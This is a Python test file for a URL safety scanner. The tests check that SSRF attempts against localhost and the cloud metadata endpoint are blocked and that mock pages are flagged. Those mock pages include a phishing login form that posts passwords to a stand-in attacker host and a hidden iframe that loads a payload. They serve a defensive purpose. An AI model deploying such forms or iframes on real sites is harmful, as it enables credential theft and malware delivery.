"""Tests for URLSentinel Isolated Scanner and DOM Safety Analyzer."""

import pytest
from unittest.mock import patch, MagicMock
from urlsentinel.core.isolated_scanner import IsolatedScanner


class TestIsolatedScanner:
    """Test suite verifying isolated content inspection and DOM analysis boundaries."""

    @pytest.mark.asyncio
    async def test_ssrf_attempt_blocked_before_fetch(self):
        result = await IsolatedScanner.analyze_target_content("http://127.0.0.1:8080/admin")
        assert result["scan_executed"] is False
        assert "SSRF Guard blocked" in result["error"]
        assert result["risk_contribution"] == "CRITICAL"

    @pytest.mark.asyncio
    async def test_metadata_endpoint_blocked(self):
        result = await IsolatedScanner.analyze_target_content("http://169.254.169.254/latest/meta-data/")
        assert result["scan_executed"] is False
        assert "SSRF Guard blocked" in result["error"]

    @pytest.mark.asyncio
    async def test_detects_password_input_and_external_action(self):
        mock_html = """
        <html>
        <head><title>Sign in to Your Account</title></head>
        <body>
            <form action="http://evil-collector.top/steal" method="POST">
                <input type="text" name="username" />
                <input type="password" name="password" />
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        """
        mock_response = MagicMock()
        mock_response.headers = {"content-type": "text/html; charset=utf-8"}
        mock_response.content = mock_html.encode("utf-8")

        with patch("httpx.AsyncClient.get", return_value=mock_response):
            with patch("urlsentinel.core.isolated_scanner.validate_destination_safety", return_value=("https://test-example.com", ["93.184.216.34"])):
                result = await IsolatedScanner.analyze_target_content("https://test-example.com/login")
                
                assert result["scan_executed"] is True
                assert result["detected_features"]["has_password_field"] is True
                assert result["detected_features"]["has_external_form_action"] is True
                assert result["risk_contribution"] == "CRITICAL"
                assert any("password input field" in f for f in result["findings"])
                assert any("external URI" in f for f in result["findings"])

    @pytest.mark.asyncio
    async def test_detects_hidden_iframe(self):
        mock_html = """
        <html>
        <body>
            <h1>Welcome</h1>
            <iframe src="http://malware-drop.top/payload" style="display:none"></iframe>
        </body>
        </html>
        """
        mock_response = MagicMock()
        mock_response.headers = {"content-type": "text/html"}
        mock_response.content = mock_html.encode("utf-8")

        with patch("httpx.AsyncClient.get", return_value=mock_response):
            with patch("urlsentinel.core.isolated_scanner.validate_destination_safety", return_value=("https://test-example.com", ["93.184.216.34"])):
                result = await IsolatedScanner.analyze_target_content("https://test-example.com")
                assert result["detected_features"]["has_hidden_iframe"] is True
                assert any("Hidden iframe" in f for f in result["findings"])

